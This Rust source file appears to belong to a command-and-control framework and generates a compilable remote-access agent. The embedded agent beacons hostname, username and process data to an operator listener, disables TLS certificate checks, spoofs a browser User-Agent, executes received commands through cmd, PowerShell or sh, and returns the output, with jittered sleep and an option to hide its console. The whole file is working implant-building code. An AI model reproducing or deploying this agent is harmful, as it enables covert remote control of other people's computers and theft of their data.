// src/agent/mod.rs - Fixed robust agent generator
use std::io;
use std::path::Path;
use std::fs::{File, create_dir_all, remove_dir_all};
use std::io::Write;
use std::process::Command;
use serde::{Serialize, Deserialize};

#[derive(Clone)]
pub struct AgentGenerator;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub listener_url: String,
    pub format: String,
    pub architecture: String,
    pub sleep_time: u32,
    pub jitter: u8,
    pub injection: String,
    pub output_path: String,
}

impl AgentGenerator {
    pub fn new() -> Self {
        AgentGenerator
    }
    
    pub fn generate(&self, config: AgentConfig) -> io::Result<()> {
        println!("Generating agent with config: {:?}", config);
        
        // Create output directory if it doesn't exist
        if let Some(parent) = Path::new(&config.output_path).parent() {
            create_dir_all(parent)?;
        }
        
        // Try multiple generation methods in order of preference
        if let Ok(_) = self.try_cross_compile_rust(&config) {
            return Ok(());
        }
        
        if let Ok(_) = self.try_native_rust(&config) {
            return Ok(());
        }
        
        if let Ok(_) = self.generate_standalone_project(&config) {
            return Ok(());
        }
        
        Err(io::Error::new(
            io::ErrorKind::Other,
            "All agent generation methods failed. Please ensure Rust is properly installed."
        ))
    }
    
    fn check_rust_installation() -> Result<(), String> {
        // Check if rustc is available
        if Command::new("rustc").arg("--version").output().is_err() {
            return Err("rustc not found".to_string());
        }
        
        // Check if cargo is available
        if Command::new("cargo").arg("--version").output().is_err() {
            return Err("cargo not found".to_string());
        }
        
        Ok(())
    }
    
    fn setup_rust_environment() -> io::Result<()> {
        println!("Setting up Rust environment...");
        
        // Set default toolchain
        let output = Command::new("rustup")
            .args(&["default", "stable"])
            .output();
        
        if let Ok(out) = output {
            if !out.status.success() {
                println!("rustup default failed: {}", String::from_utf8_lossy(&out.stderr));
            }
        }
        
        // Add Windows target
        let _ = Command::new("rustup")
            .args(&["target", "add", "x86_64-pc-windows-gnu"])
            .output();
        
        Ok(())
    }
    
    fn try_cross_compile_rust(&self, config: &AgentConfig) -> io::Result<()> {
        println!("Attempting cross-compilation...");
        
        Self::check_rust_installation().map_err(|e| {
            io::Error::new(io::ErrorKind::NotFound, format!("Rust check failed: {}", e))
        })?;
        
        Self::setup_rust_environment()?;
        
        let temp_dir = "/tmp/c2_agent_cross";
        self.create_rust_project(temp_dir, config)?;
        
        // Try cross-compilation
        let output = Command::new("cargo")
            .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
            .current_dir(temp_dir)
            .env("CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER", "x86_64-w64-mingw32-gcc")
            .output()?;
        
        if !output.status.success() {
            let _ = remove_dir_all(temp_dir);
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("Cross-compilation failed: {}", String::from_utf8_lossy(&output.stderr))
            ));
        }
        
        // Copy the binary
        let source = format!("{}/target/x86_64-pc-windows-gnu/release/agent.exe", temp_dir);
        if Path::new(&source).exists() {
            std::fs::copy(&source, &config.output_path)?;
            let _ = remove_dir_all(temp_dir);
            println!("✅ Cross-compiled Windows agent: {}", config.output_path);
            return Ok(());
        }
        
        let _ = remove_dir_all(temp_dir);
        Err(io::Error::new(io::ErrorKind::NotFound, "Cross-compiled binary not found"))
    }
    
    fn try_native_rust(&self, config: &AgentConfig) -> io::Result<()> {
        println!("Attempting native compilation...");
        
        Self::check_rust_installation().map_err(|e| {
            io::Error::new(io::ErrorKind::NotFound, format!("Rust check failed: {}", e))
        })?;
        
        let temp_dir = "/tmp/c2_agent_native";
        self.create_rust_project(temp_dir, config)?;
        
        // Try native compilation
        let output = Command::new("cargo")
            .args(&["build", "--release"])
            .current_dir(temp_dir)
            .output()?;
        
        if !output.status.success() {
            let _ = remove_dir_all(temp_dir);
            return Err(io::Error::new(
                io::ErrorKind::Other,
                format!("Native compilation failed: {}", String::from_utf8_lossy(&output.stderr))
            ));
        }
        
        // Copy the binary
        let possible_sources = vec![
            format!("{}/target/release/agent", temp_dir),
            format!("{}/target/release/agent.exe", temp_dir),
        ];
        
        for source in possible_sources {
            if Path::new(&source).exists() {
                std::fs::copy(&source, &config.output_path)?;
                
                // Make executable on Unix
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let mut perms = std::fs::metadata(&config.output_path)?.permissions();
                    perms.set_mode(0o755);
                    std::fs::set_permissions(&config.output_path, perms)?;
                }
                
                let _ = remove_dir_all(temp_dir);
                println!("✅ Native compiled agent: {}", config.output_path);
                return Ok(());
            }
        }
        
        let _ = remove_dir_all(temp_dir);
        Err(io::Error::new(io::ErrorKind::NotFound, "Native binary not found"))
    }
    
    fn generate_standalone_project(&self, config: &AgentConfig) -> io::Result<()> {
        println!("Creating standalone Rust project...");
        
        let project_dir = format!("{}_project", config.output_path.trim_end_matches(".exe"));
        create_dir_all(&project_dir)?;
        
        self.create_rust_project(&project_dir, config)?;
        
        // Create simple build script
        let build_script = format!(r#"#!/bin/bash
# Build script for C2 agent
cd "{}"
echo "Building agent..."

if command -v cargo >/dev/null 2>&1; then
    echo "Trying cross-compilation to Windows..."
    if cargo build --release --target x86_64-pc-windows-gnu; then
        if [ -f "target/x86_64-pc-windows-gnu/release/agent.exe" ]; then
            cp "target/x86_64-pc-windows-gnu/release/agent.exe" "{}"
            echo "✅ Windows agent ready: {}"
            exit 0
        fi
    fi
    
    echo "Trying native compilation..."
    if cargo build --release; then
        for binary in "target/release/agent" "target/release/agent.exe"; do
            if [ -f "$binary" ]; then
                cp "$binary" "{}"
                chmod +x "{}"
                echo "✅ Agent ready: {}"
                exit 0
            fi
        done
    fi
    
    echo "❌ Compilation failed"
else
    echo "❌ Cargo not found. Install Rust first:"
    echo "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
fi
exit 1
"#, project_dir, config.output_path, config.output_path, config.output_path, config.output_path, config.output_path);
        
        let mut build_file = File::create(format!("{}/build.sh", project_dir))?;
        build_file.write_all(build_script.as_bytes())?;
        
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(format!("{}/build.sh", project_dir))?.permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(format!("{}/build.sh", project_dir), perms)?;
        }
        
        println!("✅ Standalone Rust project created: {}", project_dir);
        println!("To build the agent:");
        println!("  cd {}", project_dir);
        println!("  ./build.sh");
        
        Ok(())
    }
    
    fn create_rust_project(&self, project_dir: &str, config: &AgentConfig) -> io::Result<()> {
        create_dir_all(format!("{}/src", project_dir))?;
        
        // Create Cargo.toml
        let cargo_toml = r#"[package]
name = "agent"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "agent"
path = "src/main.rs"

[dependencies]
tokio = { version = "1.0", features = ["full"] }
reqwest = { version = "0.11", features = ["json", "rustls-tls"], default-features = false }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
rand = "0.8"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = ["winuser", "processthreadsapi", "handleapi", "wincon"] }

[profile.release]
strip = true
lto = true
codegen-units = 1
panic = "abort"
opt-level = "z"
"#;
        
        let mut cargo_file = File::create(format!("{}/Cargo.toml", project_dir))?;
        cargo_file.write_all(cargo_toml.as_bytes())?;
        
        // Create main.rs
        let main_source = self.generate_optimized_agent_source(config);
        let mut main_file = File::create(format!("{}/src/main.rs", project_dir))?;
        main_file.write_all(main_source.as_bytes())?;
        
        Ok(())
    }
    
    fn generate_optimized_agent_source(&self, config: &AgentConfig) -> String {
        format!(r#"// C2 Agent - Generated for {}
use std::time::Duration;
use tokio::time::sleep;
use serde::{{Serialize, Deserialize}};
use std::process::Command;
use rand::Rng;

const LISTENER_URL: &str = "{}";
const SLEEP_TIME: u64 = {};
const JITTER: u8 = {};

#[derive(Serialize, Deserialize, Debug)]
struct Beacon {{
    id: String,
    hostname: String,
    username: String,
    os: String,
    arch: String,
    ip: String,
    pid: u32,
}}

#[derive(Serialize, Deserialize, Debug)]
struct Task {{
    id: String,
    command: String,
}}

#[derive(Serialize, Deserialize, Debug)]
struct TaskResult {{
    id: String,
    result: String,
    success: bool,
}}

fn get_system_info() -> Beacon {{
    let hostname = std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".to_string());
    
    let username = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "unknown".to_string());
    
    let os = if cfg!(windows) {{
        format!("Windows {{}}", std::env::var("OS").unwrap_or_default())
    }} else {{
        std::env::consts::OS.to_string()
    }};
    
    let arch = std::env::consts::ARCH.to_string();
    let pid = std::process::id();
    
    Beacon {{
        id: format!("agent-{{:08x}}", rand::thread_rng().gen::<u32>()),
        hostname,
        username,
        os,
        arch,
        ip: "127.0.0.1".to_string(),
        pid,
    }}
}}

async fn send_beacon(client: &reqwest::Client, beacon: &Beacon) -> Result<Vec<Task>, Box<dyn std::error::Error>> {{
    let response = client
        .post(&format!("{{}}/beacon", LISTENER_URL))
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .json(beacon)
        .timeout(Duration::from_secs(30))
        .send()
        .await?;
    
    if response.status().is_success() {{
        Ok(response.json().await.unwrap_or_default())
    }} else {{
        Ok(Vec::new())
    }}
}}

fn execute_command(cmd: &str) -> TaskResult {{
    let task_id = format!("task-{{:08x}}", rand::thread_rng().gen::<u32>());
    
    let (program, args) = if cfg!(windows) {{
        if cmd.starts_with("powershell ") {{
            ("powershell", vec!["-Command", &cmd[11..]])
        }} else {{
            ("cmd", vec!["/c", cmd])
        }}
    }} else {{
        ("/bin/sh", vec!["-c", cmd])
    }};
    
    match Command::new(program).args(&args).output() {{
        Ok(output) => {{
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            let result = if !stdout.trim().is_empty() {{
                stdout.trim().to_string()
            }} else if !stderr.trim().is_empty() {{
                format!("Error: {{}}", stderr.trim())
            }} else {{
                "Command executed (no output)".to_string()
            }};
            
            TaskResult {{
                id: task_id,
                result,
                success: output.status.success(),
            }}
        }}
        Err(e) => TaskResult {{
            id: task_id,
            result: format!("Execution failed: {{}}", e),
            success: false,
        }},
    }}
}}

async fn send_result(client: &reqwest::Client, result: &TaskResult) -> Result<(), Box<dyn std::error::Error>> {{
    client
        .post(&format!("{{}}/task_result", LISTENER_URL))
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .json(result)
        .timeout(Duration::from_secs(30))
        .send()
        .await?;
    
    Ok(())
}}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    // Optional: Hide console on Windows
    #[cfg(windows)]
    {{
        use winapi::um::wincon::GetConsoleWindow;
        use winapi::um::winuser::{{ShowWindow, SW_HIDE}};
        unsafe {{
            let window = GetConsoleWindow();
            if !window.is_null() {{
                // Uncomment to hide: ShowWindow(window, SW_HIDE);
            }}
        }}
    }}
    
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .build()?;
    
    let beacon = get_system_info();
    println!("Agent {{}} starting -> {{}}", beacon.id, LISTENER_URL);
    
    let mut failures = 0;
    const MAX_FAILURES: usize = 5;
    
    loop {{
        match send_beacon(&client, &beacon).await {{
            Ok(tasks) => {{
                failures = 0;
                
                for task in tasks {{
                    println!("Executing: {{}}", task.command);
                    let result = execute_command(&task.command);
                    
                    if let Err(e) = send_result(&client, &result).await {{
                        eprintln!("Failed to send result: {{}}", e);
                    }}
                }}
            }}
            Err(e) => {{
                failures += 1;
                eprintln!("Beacon failed ({{}}/{{}}): {{}}", failures, MAX_FAILURES, e);
                
                if failures >= MAX_FAILURES {{
                    eprintln!("Too many failures, exiting");
                    break;
                }}
            }}
        }}
        
        // Sleep with jitter
        let jitter = rand::thread_rng().gen_range(0..=JITTER) as f64 / 100.0;
        let sleep_time = SLEEP_TIME as f64 * (1.0 + jitter * if rand::thread_rng().gen_bool(0.5) {{ 1.0 }} else {{ -1.0 }});
        sleep(Duration::from_secs(sleep_time.max(1.0) as u64)).await;
    }}
    
    Ok(())
}}
"#, config.listener_url, config.listener_url, config.sleep_time, config.jitter)
    }
}